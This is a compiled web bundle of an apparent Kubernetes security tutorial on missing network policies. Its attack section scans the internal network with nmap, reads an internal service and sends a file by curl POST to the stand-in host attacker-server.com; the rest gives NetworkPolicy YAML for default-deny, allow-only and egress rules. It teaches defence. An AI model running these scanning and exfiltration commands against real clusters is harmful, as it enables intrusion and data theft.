"use strict";(self.webpackChunkk_8_s_security=self.webpackChunkk_8_s_security||[]).push([[3958],{4206:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>c,contentTitle:()=>a,default:()=>h,frontMatter:()=>l,metadata:()=>i,toc:()=>o});const i=JSON.parse('{"id":"k8s_security_basics/attack_vectors_examples/lack_of_network_policies","title":"Lack of Network Policies","description":"Understanding the risks of unregulated network traffic in Kubernetes and implementing best practices with Network Policies.","source":"@site/docs/k8s_security_basics/attack_vectors_examples/lack_of_network_policies.md","sourceDirName":"k8s_security_basics/attack_vectors_examples","slug":"/k8s_security_basics/attack_vectors_examples/lack_of_network_policies","permalink":"/k8s_security/docs/k8s_security_basics/attack_vectors_examples/lack_of_network_policies","draft":false,"unlisted":false,"editUrl":"https://github.com/geek-kb/k8s_security/edit/main/docs/k8s_security_basics/attack_vectors_examples/lack_of_network_policies.md","tags":[],"version":"current","sidebarPosition":4,"frontMatter":{"sidebar_position":4,"title":"Lack of Network Policies","description":"Understanding the risks of unregulated network traffic in Kubernetes and implementing best practices with Network Policies."},"sidebar":"tutorialSidebar","previous":{"title":"Privileged Containers","permalink":"/k8s_security/docs/k8s_security_basics/attack_vectors_examples/privileged_containers"},"next":{"title":"The Four C\'s of Cloud Native Security","permalink":"/k8s_security/docs/k8s_security_basics/the_4_c_cloud_native_security"}}');var t=s(4848),r=s(8453);const l={sidebar_position:4,title:"Lack of Network Policies",description:"Understanding the risks of unregulated network traffic in Kubernetes and implementing best practices with Network Policies."},a="Lack of Network Policies",c={},o=[{value:"\ud83d\udea9 Exploitation Steps: Lateral Movement in Kubernetes",id:"-exploitation-steps-lateral-movement-in-kubernetes",level:2},{value:"1. Scan the Internal Network",id:"1-scan-the-internal-network",level:3},{value:"2. Access Sensitive Services",id:"2-access-sensitive-services",level:3},{value:"3. Exfiltrate Data to an External Server",id:"3-exfiltrate-data-to-an-external-server",level:3},{value:"\u2705 Result",id:"-result",level:3},{value:"\ud83d\udee1\ufe0f Mitigation Techniques and Fixes",id:"\ufe0f-mitigation-techniques-and-fixes",level:2},{value:"1. Implement Default Deny Policies",id:"1-implement-default-deny-policies",level:3},{value:"\u2705 Example of Default Deny Policy for Ingress and Egress",id:"-example-of-default-deny-policy-for-ingress-and-egress",level:4},{value:"2. Create Allow-Only Policies",id:"2-create-allow-only-policies",level:3},{value:"\u2705 Example Allowing Traffic Only to an Application Pod",id:"-example-allowing-traffic-only-to-an-application-pod",level:4},{value:"3. Restrict Egress Traffic",id:"3-restrict-egress-traffic",level:3},{value:"\u2705 Example Egress Policy Allowing Only Specific Destinations",id:"-example-egress-policy-allowing-only-specific-destinations",level:4},{value:"\u2705 Key Takeaway",id:"-key-takeaway",level:2}];function d(e){const n={code:"code",h1:"h1",h2:"h2",h3:"h3",h4:"h4",header:"header",hr:"hr",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,r.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.header,{children:(0,t.jsx)(n.h1,{id:"lack-of-network-policies",children:"Lack of Network Policies"})}),"\n",(0,t.jsxs)(n.p,{children:["The ",(0,t.jsx)(n.strong,{children:"absence of Network Policies"})," in a ",(0,t.jsx)(n.strong,{children:"Kubernetes cluster"})," can lead to ",(0,t.jsx)(n.strong,{children:"unrestricted communication"})," between ",(0,t.jsx)(n.strong,{children:"pods"}),", allowing ",(0,t.jsx)(n.strong,{children:"lateral movement"})," and ",(0,t.jsx)(n.strong,{children:"data exfiltration"}),". Without ",(0,t.jsx)(n.strong,{children:"network segmentation"}),", an ",(0,t.jsx)(n.strong,{children:"attacker"})," who gains access to a ",(0,t.jsx)(n.strong,{children:"single pod"})," can ",(0,t.jsx)(n.strong,{children:"move freely"})," within the cluster."]}),"\n",(0,t.jsx)(n.hr,{}),"\n",(0,t.jsx)(n.h2,{id:"-exploitation-steps-lateral-movement-in-kubernetes",children:"\ud83d\udea9 Exploitation Steps: Lateral Movement in Kubernetes"}),"\n",(0,t.jsxs)(n.p,{children:["An attacker gains ",(0,t.jsx)(n.strong,{children:"initial access"})," to a ",(0,t.jsx)(n.strong,{children:"compromised pod"}),":"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"kubectl exec -it <compromised-pod> -- /bin/sh\n"})}),"\n",(0,t.jsx)(n.h3,{id:"1-scan-the-internal-network",children:"1. Scan the Internal Network"}),"\n",(0,t.jsxs)(n.p,{children:["The ",(0,t.jsx)(n.strong,{children:"attacker"})," discovers other ",(0,t.jsx)(n.strong,{children:"pods and services"})," in the ",(0,t.jsx)(n.strong,{children:"cluster"})," using ",(0,t.jsx)(n.strong,{children:"internal scanning tools"}),":"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"apt-get update && apt-get install -y nmap\nnmap -p 80,443,8080 10.0.0.0/24\n"})}),"\n",(0,t.jsx)(n.h3,{id:"2-access-sensitive-services",children:"2. Access Sensitive Services"}),"\n",(0,t.jsxs)(n.p,{children:["The ",(0,t.jsx)(n.strong,{children:"attacker"})," can ",(0,t.jsx)(n.strong,{children:"connect"})," to ",(0,t.jsx)(n.strong,{children:"open services"})," in other pods, such as ",(0,t.jsx)(n.strong,{children:"databases"})," or ",(0,t.jsx)(n.strong,{children:"APIs"}),":"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"curl http://10.0.0.15:8080/secret-data\n"})}),"\n",(0,t.jsx)(n.h3,{id:"3-exfiltrate-data-to-an-external-server",children:"3. Exfiltrate Data to an External Server"}),"\n",(0,t.jsxs)(n.p,{children:["The ",(0,t.jsx)(n.strong,{children:"attacker"})," sends ",(0,t.jsx)(n.strong,{children:"sensitive data"})," to an ",(0,t.jsx)(n.strong,{children:"external server"})," using a ",(0,t.jsx)(n.strong,{children:"simple HTTP request"}),":"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"curl -X POST -d @/path/to/secret-data http://attacker-server.com/upload\n"})}),"\n",(0,t.jsx)(n.h3,{id:"-result",children:"\u2705 Result"}),"\n",(0,t.jsxs)(n.p,{children:["The attacker can ",(0,t.jsx)(n.strong,{children:"move laterally"})," within the ",(0,t.jsx)(n.strong,{children:"cluster"}),", access ",(0,t.jsx)(n.strong,{children:"sensitive data"}),", and ",(0,t.jsx)(n.strong,{children:"exfiltrate information"})," without ",(0,t.jsx)(n.strong,{children:"network restrictions"}),"."]}),"\n",(0,t.jsx)(n.hr,{}),"\n",(0,t.jsx)(n.h2,{id:"\ufe0f-mitigation-techniques-and-fixes",children:"\ud83d\udee1\ufe0f Mitigation Techniques and Fixes"}),"\n",(0,t.jsx)(n.h3,{id:"1-implement-default-deny-policies",children:"1. Implement Default Deny Policies"}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Issue:"})," By default, all ",(0,t.jsx)(n.strong,{children:"pods"})," can ",(0,t.jsx)(n.strong,{children:"communicate"})," with ",(0,t.jsx)(n.strong,{children:"each other"}),", creating ",(0,t.jsx)(n.strong,{children:"security risks"}),"."]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Fix:"})," Apply a ",(0,t.jsx)(n.strong,{children:"default deny policy"})," to ",(0,t.jsx)(n.strong,{children:"block all traffic"})," by ",(0,t.jsx)(n.strong,{children:"default"}),"."]}),"\n"]}),"\n",(0,t.jsx)(n.h4,{id:"-example-of-default-deny-policy-for-ingress-and-egress",children:"\u2705 Example of Default Deny Policy for Ingress and Egress"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-yaml",children:"apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: default-deny-all\n  namespace: default\nspec:\n  podSelector: {}\n  policyTypes:\n  - Ingress\n  - Egress\n"})}),"\n",(0,t.jsx)(n.h3,{id:"2-create-allow-only-policies",children:"2. Create Allow-Only Policies"}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Issue:"})," Lack of ",(0,t.jsx)(n.strong,{children:"specific allow rules"})," means that ",(0,t.jsx)(n.strong,{children:"unwanted traffic"})," is ",(0,t.jsx)(n.strong,{children:"not blocked"}),"."]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Fix:"})," Use ",(0,t.jsx)(n.strong,{children:"Network Policies"})," to ",(0,t.jsx)(n.strong,{children:"allow traffic"})," only to ",(0,t.jsx)(n.strong,{children:"specific pods"})," or ",(0,t.jsx)(n.strong,{children:"services"}),"."]}),"\n"]}),"\n",(0,t.jsx)(n.h4,{id:"-example-allowing-traffic-only-to-an-application-pod",children:"\u2705 Example Allowing Traffic Only to an Application Pod"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-yaml",children:"apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: allow-app-traffic\n  namespace: default\nspec:\n  podSelector:\n    matchLabels:\n      app: my-app\n  policyTypes:\n  - Ingress\n  ingress:\n  - from:\n    - podSelector:\n        matchLabels:\n          role: frontend\n    ports:\n    - protocol: TCP\n      port: 80\n"})}),"\n",(0,t.jsx)(n.h3,{id:"3-restrict-egress-traffic",children:"3. Restrict Egress Traffic"}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Issue:"})," Unrestricted ",(0,t.jsx)(n.strong,{children:"outgoing traffic"})," can ",(0,t.jsx)(n.strong,{children:"leak sensitive data"})," to ",(0,t.jsx)(n.strong,{children:"external servers"}),"."]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Fix:"})," Define ",(0,t.jsx)(n.strong,{children:"egress rules"})," to ",(0,t.jsx)(n.strong,{children:"control outbound connections"}),"."]}),"\n"]}),"\n",(0,t.jsx)(n.h4,{id:"-example-egress-policy-allowing-only-specific-destinations",children:"\u2705 Example Egress Policy Allowing Only Specific Destinations"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-yaml",children:"apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: restrict-egress\n  namespace: default\nspec:\n  podSelector:\n    matchLabels:\n      role: database\n  policyTypes:\n  - Egress\n  egress:\n  - to:\n    - ipBlock:\n        cidr: 10.0.0.0/24\n    ports:\n    - protocol: TCP\n      port: 5432\n"})}),"\n",(0,t.jsx)(n.hr,{}),"\n",(0,t.jsx)(n.h2,{id:"-key-takeaway",children:"\u2705 Key Takeaway"}),"\n",(0,t.jsxs)(n.p,{children:["To ",(0,t.jsx)(n.strong,{children:"enhance security"})," and ",(0,t.jsx)(n.strong,{children:"limit lateral movement"})," within the ",(0,t.jsx)(n.strong,{children:"Kubernetes cluster"}),":"]}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:["Implement ",(0,t.jsx)(n.strong,{children:"default deny policies"})," for ",(0,t.jsx)(n.strong,{children:"ingress"})," and ",(0,t.jsx)(n.strong,{children:"egress traffic"}),"."]}),"\n",(0,t.jsxs)(n.li,{children:["Create ",(0,t.jsx)(n.strong,{children:"specific allow rules"})," using ",(0,t.jsx)(n.strong,{children:"Network Policies"}),"."]}),"\n",(0,t.jsxs)(n.li,{children:["Regularly ",(0,t.jsx)(n.strong,{children:"audit and validate network policies"})," to ensure ",(0,t.jsx)(n.strong,{children:"only necessary communication"})," is allowed."]}),"\n"]})]})}function h(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(d,{...e})}):d(e)}},8453:(e,n,s)=>{s.d(n,{R:()=>l,x:()=>a});var i=s(6540);const t={},r=i.createContext(t);function l(e){const n=i.useContext(r);return i.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:l(e.components),i.createElement(r.Provider,{value:n},e.children)}}}]);